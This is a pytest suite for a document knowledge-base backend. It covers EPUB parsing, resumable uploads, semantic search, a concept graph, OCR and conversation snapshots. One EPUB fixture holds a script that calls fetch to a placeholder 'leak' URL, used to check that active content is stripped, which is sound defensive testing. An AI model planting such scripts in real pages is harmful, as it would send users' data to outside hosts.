import asyncio
import hashlib
import io
import json
import shutil

import pytest
from PIL import Image, ImageDraw, ImageFont
from sqlalchemy import insert, select

from backend import storage as store
from backend.smolin import intelligence, service
from backend.smolin.formats import extract_package
from backend.tests.test_smolin_files import finished, package, send


def test_epub_spine_metadata_labels_and_active_content_not_executed(tmp_path):
    raw = package(
        {
            "META-INF/container.xml": '<container><rootfiles><rootfile full-path="OPS/book.opf"/></rootfiles></container>',
            "OPS/book.opf": '<package><metadata><title>Genética documental</title><creator>Ana</creator></metadata><manifest><item id="b" href="z.xhtml" media-type="application/xhtml+xml"/><item id="a" href="a.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="b"/><itemref idref="a"/></spine></package>',
            "OPS/z.xhtml": '<html><body><h1>Primeiro capítulo</h1><p>Mutação causa variabilidade.</p><script>fetch("https://example.com/leak")</script></body></html>',
            "OPS/a.xhtml": "<html><body><h1>Segundo capítulo</h1><p>Seleção natural.</p></body></html>",
        }
    )
    path = tmp_path / "sample.epub"
    path.write_bytes(raw)
    doc = extract_package(path, "epub", 10)
    assert doc["title"] == "Genética documental" and doc["author"] == "Ana"
    assert [p["label"] for p in doc["pages"]] == ["Primeiro capítulo", "Segundo capítulo"]
    assert "fetch" not in doc["pages"][0]["content"]
    path.write_bytes(
        package(
            {"META-INF/container.xml": '<container><rootfile full-path="absent.opf"/></container>'}
        )
    )
    with pytest.raises(ValueError, match="OPF"):
        extract_package(path, "epub", 10)


def test_transfer_resume_survives_database_reopen_and_confirms_all_bytes(client):
    raw = b"\x00raw-data" * 600000
    record = client.post(
        "/api/knowledge/uploads", json={"name": "bulk.bin", "size": len(raw)}
    ).json()
    url = "/api/knowledge/uploads/" + record["id"]
    first = raw[: 2 * 1024 * 1024]
    assert (
        client.put(
            url + "?offset=0",
            content=first,
            headers={"Content-Type": "application/octet-stream", "X-Saly-Request": "1"},
        ).status_code
        == 200
    )
    store.initialize()
    status = client.get(url).json()
    assert status["offset"] == len(first)
    assert status["block_sha256"] == [hashlib.sha256(first).hexdigest()]
    assert client.get("/api/knowledge/uploads").json()[0]["id"] == record["id"]
    for offset in range(len(first), len(raw), 2 * 1024 * 1024):
        assert (
            client.put(
                url + f"?offset={offset}",
                content=raw[offset : offset + 2 * 1024 * 1024],
                headers={"Content-Type": "application/octet-stream", "X-Saly-Request": "1"},
            ).status_code
            == 200
        )
    result = client.post(url + "/complete", json={}).json()
    assert client.get(f"/api/knowledge/{result['id']}/original").content == raw
    assert client.get(url).status_code == 404


def test_checkpoint_resume_skips_completed_page_without_reextracting(client, monkeypatch):
    result = service.upload(b"Checkpoint example", "recover.txt")
    key = result["id"]
    job_id = result["job_id"]
    parsed = {
        "pages": [
            {"page": 1, "content": "Célula e genética."},
            {"page": 2, "content": "Mutação e evolução."},
        ],
        "title": "Recuperação",
        "author": "Ana",
        "unit": "page",
    }
    service.checkpoint(job_id).write_text(json.dumps(parsed))
    first = next(service.chunk_page(parsed["pages"][0]["content"]))
    with store.db() as c:
        c.execute(
            insert(store.chunks).values(
                id="first-retained", document_id=key, page=1, position=0, content=first
            )
        )
    job = store.get("document_jobs", job_id)
    store.save(
        "document_jobs",
        {
            **job,
            "status": "paused",
            "indexing_started": True,
            "processed_pages": 1,
            "chunk_count": 1,
        },
        job_id,
    )

    async def no_parser(*args, **kwargs):
        pytest.fail("Completed extraction must not run again on checkpoint resume")

    monkeypatch.setattr(asyncio, "create_subprocess_exec", no_parser)
    store.initialize()
    assert client.post(f"/api/knowledge/jobs/{job_id}/resume", json={}).status_code == 200
    doc = finished(client, key)
    assert doc["status"] == "ready" and doc["chunks"] == 2
    with store.db() as c:
        assert (
            c.execute(select(store.chunks.c.id).where(store.chunks.c.page == 1)).scalar()
            == "first-retained"
        )
    assert not service.checkpoint(job_id).exists()


def test_paused_processing_is_not_started_until_resumed(client):
    result = service.upload(b"Biologia molecular.", "paused.txt")
    job_id = result["job_id"]
    response = client.post(f"/api/knowledge/jobs/{job_id}/pause", json={})
    assert response.status_code == 200 and response.json()["status"] == "paused"
    asyncio.run(service.process(result["id"], job_id))
    assert store.get("document_jobs", job_id)["status"] == "paused"
    assert client.post(f"/api/knowledge/jobs/{job_id}/resume", json={}).status_code == 200
    assert finished(client, result["id"])["status"] == "ready"
    assert client.post(f"/api/knowledge/jobs/{job_id}/pause", json={}).status_code == 409


def seed_corpus(client):
    examples = [
        ("a.txt", "Genética mutação variabilidade evolução."),
        ("b.txt", "Mutação genética hereditariedade evolução."),
        ("c.txt", "Variabilidade evolução seleção adaptação."),
        ("d.txt", "Astronomia estrela galáxia telescópio."),
    ]
    return [finished(client, send(client, text.encode(), name)["id"]) for name, text in examples]


def test_lsa_is_real_persistent_bounded_and_document_filter_precedes_ranking(client):
    docs = seed_corpus(client)
    found, state = intelligence.semantic("hereditariedade")
    assert state["state"] == "ready" and found
    assert any(
        row["document_id"] == docs[0]["id"] and "hereditariedade" not in row["content"].casefold()
        for row in found
    ), "LSA must retrieve a corpus association without literal query overlap"
    assert (store.DATA / "smolin-lsa.npz").exists()
    assert len(intelligence.model(intelligence.rows())["components"]) >= 1
    assert intelligence.semantic("zzzzunknown")[1]["state"] == "no_vocabulary_match"
    key = docs[0]["id"]
    response = client.get(
        "/api/knowledge/search", params={"q": "genética", "document_id": key}
    ).json()
    assert response and all(r["id"] == key for r in response)
    assert all(r["chunk_id"] and r["url"].endswith("#page=1") for r in response)
    assert not client.get("/api/knowledge/search", params={"q": "zzzzunknown"}).json()
    catalog = client.get("/api/knowledge").json()
    assert all("pages" not in d and "content" not in d for d in catalog)
    assert client.get("/api/knowledge/retrieval").json()["local_lsa"]


def test_graph_connections_always_have_surviving_evidence_and_deletion_cleans_index(client):
    docs = seed_corpus(client)
    graph = client.get("/api/knowledge/map").json()
    assert graph["nodes"] and graph["edges"]
    mutation = next(n for n in graph["nodes"] if n["id"] == "mutacao")
    assert len({s["document_id"] for s in mutation["sources"]}) == 2
    for edge in graph["edges"]:
        assert edge["kind"] == "documented_cooccurrence" and edge["sources"]
        for source in edge["sources"]:
            assert store.get("documents", source["document_id"])
            assert source["chunk_id"] and source["excerpt"]
    key = docs[0]["id"]
    assert (
        client.delete("/api/knowledge/" + key, headers={"X-Saly-Request": "1"}).status_code == 400
    )
    intelligence.semantic("genética")
    assert (
        client.delete(
            "/api/knowledge/" + key + "?confirm=true", headers={"X-Saly-Request": "1"}
        ).status_code
        == 200
    )
    assert not (store.DATA / "smolin-lsa.npz").exists()
    graph = client.get("/api/knowledge/map").json()
    assert all(s["document_id"] != key for n in graph["nodes"] for s in n["sources"])
    assert all(r["id"] != key for r in client.get("/api/knowledge/search?q=genética").json())
    client.cookies.clear()
    assert client.get("/api/knowledge/map").status_code == 401


@pytest.mark.skipif(
    not shutil.which("pdftoppm") or not shutil.which("tesseract"),
    reason="Native PDF OCR engines missing",
)
def test_scanned_pdf_optional_real_ocr_original_untouched(client):
    image = Image.new("RGB", (1200, 600), "white")
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 64)
    ImageDraw.Draw(image).text((60, 140), "BIOLOGY CELL GENETICS", font=font, fill="black")
    stream = io.BytesIO()
    image.save(stream, format="PDF")
    raw = stream.getvalue()
    key = send(client, raw, "scan.pdf")["id"]
    assert finished(client, key)["status"] == "ocr_required"
    result = client.post(f"/api/knowledge/{key}/ocr", json={})
    assert result.status_code == 200
    doc = finished(client, key)
    assert "BIOLOGY" in doc["content"].upper() and doc["pages"][0]["method"] == "pdf_ocr_tesseract"
    assert client.get(f"/api/knowledge/{key}/original").content == raw
    assert client.get("/api/knowledge/search?q=BIOLOGY").json()[0]["page"] == 1


def test_history_snapshot_is_private_bounded_and_does_not_expose_tool_payloads(client):
    conversation = store.save("conversations", {"title": "Genética"})
    for i in range(105):
        store.save(
            "messages",
            {
                "conversation_id": conversation["id"],
                "role": "user" if i % 2 else "assistant",
                "content": str(i),
                "tool_private": {"key": "not-exported"},
            },
        )
    result = client.get(f"/api/conversations/{conversation['id']}/snapshot")
    assert result.status_code == 200
    value = result.json()
    assert len(value["messages"]) == 100 and value["messages"][0]["content"] == "5"
    assert "not-exported" not in result.text
    client.cookies.clear()
    assert client.get(f"/api/conversations/{conversation['id']}/snapshot").status_code == 401
